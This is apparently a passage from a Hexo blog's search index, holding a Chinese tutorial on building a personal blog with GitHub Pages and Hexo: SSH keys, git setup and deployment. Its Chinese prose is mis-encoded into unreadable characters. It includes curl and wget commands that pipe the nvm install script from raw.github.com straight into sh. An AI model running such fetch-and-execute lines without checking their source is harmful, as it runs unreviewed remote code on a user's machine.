Debian)ï¼š<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)ï¼š<code>sudo yum install git-core</code> </li></ul><h3 id="3-é…ç½®SSHè¿æ¥GitHub"><a href="#3-é…ç½®SSHè¿æ¥GitHub" class="headerlink" title="3. é…ç½®SSHè¿æ¥GitHub"></a>3. é…ç½®SSHè¿æ¥GitHub</h3><ol><li><p>é…ç½®SSH Key</p><ul><li><p>æ£€æŸ¥æœ¬æœºæ˜¯å¦æœ‰ssh keyè®¾ç½®</p><p>å³é”®æ‰“å¼€git bash</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ²¡æœ‰åˆ™æç¤ºï¼š No such file or directoryï¼Œåˆ™éœ€è¦ç”Ÿæˆsshå¯†é’¥</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;githubæ³¨å†Œé‚®ç®±&quot;</span><br></pre></td></tr></table></figure><ul><li><p>ç„¶åè¿ç»­3æ¬¡å›è½¦ï¼Œæœ€ç»ˆä¼šç”Ÿæˆä¸€ä¸ª.sshæ–‡ä»¶ å¤åˆ¶.ssh/id_rsa.pubé‡Œå†…å®¹<br>è·¯å¾„ä¸ºï¼šC:\Users\Administrator/.ssh (Administratorä¸ºä½ å½“å‰ç™»å½•ç”µè„‘ä½¿ç”¨çš„ç”¨æˆ·å)</p></li><li><p>æ‰“å¼€github - å³ä¸Šè§’å¤´åƒ -Setting - SSH and GPG keys - New SSH key<br>titleéšä¾¿å¡«å†™ï¼ŒKeyå†…å®¹ä¸º.ssh/id_rsa.pubçš„å†…å®¹</p><p><img src="/2019/03/13/åˆ©ç”¨github pages+hexo æ­å»ºä¸ªäººåšå®¢/14398360-5516f5c5666265cd.png" alt="åˆ©ç”¨github pages+hexo æ­å»ºä¸ªäººåšå®¢"></p></li></ul></li><li><p>é…ç½®è´¦æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name â€œyour_usernameâ€  #è®¾ç½®ç”¨æˆ·å</span><br><span class="line">git config --global user.email â€œyour_registered_github_Emailâ€  </span><br><span class="line">#è®¾ç½®é‚®ç®±åœ°å€(å»ºè®®ç”¨æ³¨å†Œgiuhubçš„é‚®ç®±)</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>æµ‹è¯•æ˜¯å¦é…ç½®æˆåŠŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com       # é‚®ç®±åœ°å€ä¸éœ€è¦æ”¹ã€‚</span><br></pre></td></tr></table></figure><p>ç›´æ¥å›è½¦ï¼Œæœ€åçœ‹åˆ°è¿™ä¸ªå°±è¯´æ˜å¤§åŠŸå‘Šæˆï¼š</p><p><em>Hi username! Youâ€™ve successfully authenticated, but GitHub does not provide shell access.</em></p></li></ol><h3 id="4-å…‹éš†åˆ°æœ¬åœ°å­˜å‚¨åº“"><a href="#4-å…‹éš†åˆ°æœ¬åœ°å­˜å‚¨åº“" class="headerlink" title="4. å…‹éš†åˆ°æœ¬åœ°å­˜å‚¨åº“"></a>4. å…‹éš†åˆ°æœ¬åœ°å­˜å‚¨åº“</h3><p>è½¬åˆ°è¦å­˜å‚¨é¡¹ç›®çš„æ–‡ä»¶å¤¹ï¼Œç„¶åå…‹éš†æ–°å­˜å‚¨åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ç”¨æˆ·å/ç”¨æˆ·å.github.io</span><br></pre></td></tr></table></figure><h3 id="5-åˆ›å»ºå†…å®¹"><a href="#5-åˆ›å»ºå†…å®¹" class="headerlink" title="5. åˆ›å»ºå†…å®¹"></a>5. åˆ›å»ºå†…å®¹</h3><p>è½¬å…¥é¡¹ç›®æ–‡ä»¶å¤¹å¹¶æ·»åŠ index.htmlæ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd username.github.io</span><br><span class="line">echoâ€œHello Worldâ€&gt;index.html</span><br></pre></td></tr></table></figure><h3 id="6-æ¨é€åˆ°GitHub"><a href="#6-æ¨é€åˆ°GitHub" class="headerlink" title="6. æ¨é€åˆ°GitHub"></a>6. æ¨é€åˆ°GitHub</h3><p>æ·»åŠ ï¼Œæäº¤å’Œæ¨é€ä½ çš„æ›´æ”¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add --all</span><br><span class="line">git commit -mâ€œåˆå§‹æäº¤â€</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h3 id="7-æµè§ˆä½ çš„Github-Pages"><a href="#7-æµè§ˆä½ çš„Github-Pages" class="headerlink" title="7.æµè§ˆä½ çš„Github Pages"></a>7.æµè§ˆä½ çš„Github Pages</h3><p>Well doneï¼Œå¯åŠ¨æµè§ˆå™¨å¹¶è½¬åˆ°<a href="https://username.github.ioã€‚" target="_blank" rel="noopener">https://username.github.ioã€‚</a></p><h2 id="äºŒã€ä½¿ç”¨Hexoåšå®¢æ¡†æ¶"><a href="#äºŒã€ä½¿ç”¨Hexoåšå®¢æ¡†æ¶" class="headerlink" title="äºŒã€ä½¿ç”¨Hexoåšå®¢æ¡†æ¶"></a>äºŒã€ä½¿ç”¨Hexoåšå®¢æ¡†æ¶</h2><p>Hexo æ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„åšå®¢æ¡†æ¶ã€‚Hexo ä½¿ç”¨ <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>ï¼ˆæˆ–å…¶ä»–æ¸²æŸ“å¼•æ“ï¼‰è§£ææ–‡ç« ï¼Œåœ¨å‡ ç§’å†…ï¼Œå³å¯åˆ©ç”¨é“ä¸½çš„ä¸»é¢˜ç”Ÿæˆé™æ€ç½‘é¡µã€‚</p><h3 id="1-å®‰è£…å‰æ"><a href="#1-å®‰è£…å‰æ" class="headerlink" title="1. å®‰è£…å‰æ"></a>1. å®‰è£…å‰æ</h3><ol><li>å®‰è£… Hexo ç›¸å½“ç®€å•ã€‚ç„¶è€Œåœ¨å®‰è£…å‰ï¼Œéœ€ç¡®ä¿å·²å®‰è£…ä¸‹åˆ—åº”ç”¨ç¨‹åºï¼š</li></ol><ul><li><p><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a></p></li><li><p><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></p></li></ul><ol start="2"><li><p>å®‰è£… Gitï¼Œå¹¶å¼€å¯sshè¿æ¥</p><p>ä¸Šæ–‡å·²ä»‹ç»å®‰è£…å’Œè¿æ¥æ­¥éª¤</p></li></ol><ol start="3"><li>å®‰è£… Node.js</li></ol><p>å®‰è£… Node.js çš„æœ€ä½³æ–¹å¼æ˜¯ä½¿ç”¨ <a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>ã€‚</p><p>cURL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>Wget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåï¼Œé‡å¯ç»ˆç«¯å¹¶æ‰§è¡Œä¸‹åˆ—å‘½ä»¤å³å¯å®‰è£… Node.jsã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nvm install stable</span><br></pre></td></tr></table></figure><p>æˆ–è€…æ‚¨ä¹Ÿå¯ä»¥ä¸‹è½½ <a href="http://nodejs.org/" target="_blank" rel="noopener">å®‰è£…ç¨‹åº</a> æ¥å®‰è£…ã€‚</p><blockquote><p>Windows ç”¨æˆ·</p><p>å¯¹äºwindowsç”¨æˆ·æ¥è¯´ï¼Œå»ºè®®ä½¿ç”¨å®‰è£…ç¨‹åºè¿›è¡Œå®‰è£…ã€‚å®‰è£…æ—¶ï¼Œè¯·å‹¾é€‰<strong>Add to PATH</strong>é€‰é¡¹ã€‚<br>å¦å¤–ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨<strong>Git Bash</strong>ï¼Œè¿™æ˜¯git for windowsè‡ªå¸¦çš„ä¸€ç»„ç¨‹åºï¼Œæä¾›äº†Linuxé£æ ¼çš„shellï¼Œåœ¨è¯¥ç¯å¢ƒä¸‹ï¼Œæ‚¨å¯ä»¥ç›´æ¥ç”¨ä¸Šé¢æåˆ°çš„å‘½ä»¤æ¥å®‰è£…Node.jsã€‚æ‰“å¼€å®ƒçš„æ–¹æ³•å¾ˆç®€å•ï¼Œåœ¨ä»»æ„ä½ç½®å•å‡»å³é”®ï¼Œé€‰æ‹©â€œGit Bash Hereâ€å³å¯ã€‚ç”±äºHexoçš„å¾ˆå¤šæ“ä½œéƒ½æ¶‰åŠåˆ°å‘½ä»¤è¡Œï¼Œæ‚¨å¯ä»¥è€ƒè™‘å§‹ç»ˆä½¿ç”¨<strong>Git Bash</strong>æ¥è¿›è¡Œæ“ä½œã€‚</p></blockquote><h3 id="2-å¿«é€Ÿéƒ¨ç½²Hexo"><a href="#2-å¿«é€Ÿéƒ¨ç½²Hexo" class="headerlink" title="2. å¿«é€Ÿéƒ¨ç½²Hexo"></a>2. å¿«é€Ÿéƒ¨ç½²Hexo</h3><p>æ‰€æœ‰å¿…å¤‡çš„åº”ç”¨ç¨‹åºå®‰è£…å®Œæˆåï¼Œå³å¯ä½¿ç”¨ npm å®‰è£… Hexoã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>å®‰è£… Hexo å®Œæˆåï¼Œè¯·æ‰§è¡Œä¸‹åˆ—å‘½ä»¤ï¼ŒHexo å°†ä¼šåœ¨æŒ‡å®šæ–‡ä»¶å¤¹ä¸­æ–°å»ºæ‰€éœ€è¦çš„æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>æ–°å»ºå®Œæˆåï¼ŒæŒ‡å®šæ–‡ä»¶å¤¹çš„ç›®å½•å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ _config.yml</span><br><span class="line">â”œâ”€â”€ package.json</span><br><span class="line">â”œâ”€â”€ scaffolds</span><br><span class="line">â”œâ”€â”€ source</span><br><span class="line">|   â”œâ”€â”€ _drafts</span><br><span class="line">|   â””â”€â”€ _posts</span><br><span class="line">â””â”€â”€ themes</span><br></pre></td></tr></table></figure><p><strong>_config.yml</strong></p><p>ç½‘ç«™çš„é…ç½®ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤é…ç½®å¤§éƒ¨åˆ†çš„å‚æ•°ã€‚</p><p><strong>package.json</strong></p><p>åº”ç”¨ç¨‹åºä¿¡æ¯ï¼Œæ–°æ·»åŠ çš„æ’ä»¶å†…å®¹ä¹Ÿä¼šå‡ºç°åœ¨è¿™é‡Œé¢ã€‚</p><p><strong>scaffolds</strong></p><p>æ¨¡ç‰ˆæ–‡ä»¶å¤¹ã€‚å½“æ‚¨æ–°å»ºæ–‡ç« æ—¶ï¼ŒHexo ä¼šæ ¹æ® scaffold æ¥å»ºç«‹æ–‡ä»¶ã€‚</p><p>è¿™é‡Œæ”¾äº†ä¸‰ä¸ªæ¨¡æ¿æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯æ–°æ·»åŠ åšå®¢æ–‡ç« ï¼ˆpostsï¼‰ã€æ–°æ·»åŠ åšå®¢é¡µï¼ˆpageï¼‰å’Œæ–°æ·»åŠ è‰ç¨¿ï¼ˆdraftï¼‰çš„ç›®æ ‡æ ·å¼ã€‚</p><p><strong>source</strong></p><p>èµ„æºæ–‡ä»¶å¤¹æ˜¯å­˜æ”¾åšå®¢å†…å®¹çš„åœ°æ–¹ã€‚é™¤ <code>_posts</code> æ–‡ä»¶å¤¹ä¹‹å¤–ï¼Œå¼€å¤´å‘½åä¸º <code>_</code> (ä¸‹åˆ’çº¿)çš„æ–‡ä»¶ / æ–‡ä»¶å¤¹å’Œéšè—çš„æ–‡ä»¶å°†ä¼šè¢«å¿½ç•¥ã€‚ä¹‹åæˆ‘ä»¬é€šè¿‡å‘½ä»¤æ–°å»ºtagsï¼ˆæ ‡ç­¾ï¼‰è¿˜æœ‰categoriesï¼ˆåˆ†ç±»ï¼‰é¡µåï¼Œè¿™é‡Œä¼šç›¸åº”åœ°å¢åŠ æ–‡ä»¶å¤¹ã€‚</p><p><strong>themes</strong></p><p>ä¸»é¢˜æ–‡ä»¶å¤¹ã€‚Hexo ä¼šæ ¹æ®ä¸»é¢˜æ¥ç”Ÿæˆé™æ€é¡µé¢ã€‚</p><h3 id="3-Hexoå‘½ä»¤"><a href="#3-Hexoå‘½ä»¤" class="headerlink" title="3. Hexoå‘½ä»¤"></a>3. Hexoå‘½ä»¤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g(generate)#ç”Ÿæˆé™æ€é¡µé¢</span><br><span class="line">hexo s(server)#å¯åŠ¨æœåŠ¡å™¨ï¼Œé»˜è®¤4000ç«¯å£ï¼Œåœ¨æœ¬åœ°æŸ¥çœ‹å†…å®¹</span><br></pre></td></tr></table></figure><h3 id="4-éƒ¨ç½²åˆ°github"><a href="#4-éƒ¨ç½²åˆ°github" class="headerlink" title="4. éƒ¨ç½²åˆ°github"></a>4. éƒ¨ç½²åˆ°github</h3><p>ä¿®æ”¹git/blog/_config.ymlé…ç½®ï¼Œæ‰¾åˆ°Deploymentéƒ¨åˆ†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch] #published</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><p>å®‰è£… hexo-deployer-git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save   #ç¬¬ä¸€æ¬¡éƒ¨ç½²éœ€è¦å…ˆå®‰è£…æ’ä»¶</span><br></pre></td></tr></table></figure><p><strong>éƒ¨ç½²</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d(deploy) #éƒ¨ç½²åˆ°ç½‘ç«™</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å¯ä»¥è®¿é—®æˆ‘ä»¬çš„GitHub pagesé¡µé¢ï¼ŒæŸ¥çœ‹æ•ˆæœå•¦</p><h3 id="5-æœ€å"><a href="#5-æœ€å" class="headerlink" title="5. æœ€å"></a>5. æœ€å</h3><p>å…³äºhexoçš„æœ€æ–°è¯¦ç»†é…ç½®ï¼Œå¯ä»¥å‚è€ƒ[hexoå®˜æ–¹æ–‡æ¡£]:<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> åšå®¢ </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
